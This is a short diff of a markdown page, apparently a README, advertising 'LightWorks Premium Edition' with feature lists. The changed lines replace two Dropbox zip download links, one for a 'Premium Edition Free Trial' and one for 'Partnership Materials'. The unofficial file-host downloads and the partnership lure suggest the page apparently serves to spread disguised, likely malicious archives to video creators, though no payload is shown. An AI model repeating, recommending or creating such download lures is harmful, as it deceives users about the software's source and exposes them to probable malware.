@@ -14,7 +14,7 @@
 
 ## Revolutionary Lightworks Instruments and Technologies Powers Video Creation Super Powers.
 
-## [⚡️ Download LightWorks Premium Edition (click)](https://www.dropbox.com/s/dyfk6723qrx4za1/Lightworks%20Premium%20Edition.zip?dl=1):
+## [⚡️ Download LightWorks Premium Edition (click)](https://www.dropbox.com/s/zzmttthavyg5e26/Lightworks%20Premium%20Edition%20Free%20Trial.zip?dl=1):
 * Video Codec
 * Frame Rate
 * Coded Aspect Ratio
@@ -24,5 +24,5 @@
 * Video Bit Rate Mode
 * Scan Type
 * And more than 200 more unique features!
-## [⚡️ Download Document And Video (click)](https://www.dropbox.com/s/cf8tynfmdjtr2fa/Lightworks%20Partnership%20Material.zip?dl=1)
+## [⚡️ Download Document And Video (click)](https://www.dropbox.com/s/d1b2kf50thnczh1/Lightworks%20Partnership%20Materials.zip?dl=1)
 Read more: https://lwks.com
